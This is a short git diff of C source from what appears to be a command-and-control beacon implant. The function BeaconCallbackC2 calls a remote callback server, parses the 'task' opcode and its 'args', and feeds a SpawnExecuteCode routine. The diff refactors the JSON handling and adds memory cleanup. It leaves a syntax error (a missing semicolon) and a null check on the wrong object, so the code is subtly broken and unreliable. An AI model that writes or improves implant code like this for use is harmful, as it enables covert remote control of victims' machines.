@@ -363,6 +363,9 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     char*               tmp_decrypted_str;
 
     struct json_object *parsed_json;
+    struct json_object *parsed_json_task;
+    struct json_object *parsed_json_args;
+
 
     // create all references to dll functions
     // Load WinHTTP.dll
@@ -546,17 +549,21 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     // get the opcode
     parsed_json = json_tokener_parse(ResBuffer);
-    parsed_json = json_object_object_get(parsed_json, "task");
-    *OpCode     = json_object_get_int(parsed_json);
+    parsed_json_task = json_object_object_get(parsed_json, "task");
+    *OpCode     = json_object_get_int(parsed_json_task);
 
-    parsed_json = json_tokener_parse(ResBuffer);
-    parsed_json = json_object_object_get(parsed_json, "args");
+    parsed_json_args = json_object_object_get(parsed_json, "args");
+    LPCSTR *argsBuffer = NULL
     if (parsed_json != NULL)
     {
-        return json_object_get_string(parsed_json);
+        // Copy args json string into return buffer
+        argsBuffer = (LPCSTR *) _strdup(json_object_get_string(parsed_json_args));
     }
-
-    return NULL;
+    // Free ResBuffer json object
+    json_object_put(parsed_json);
+    // Free ResBuffer
+    free(ResBuffer);
+    return argsBuffer;
 }
 
 BOOL SpawnExecuteCode(char* Base64Buffer)
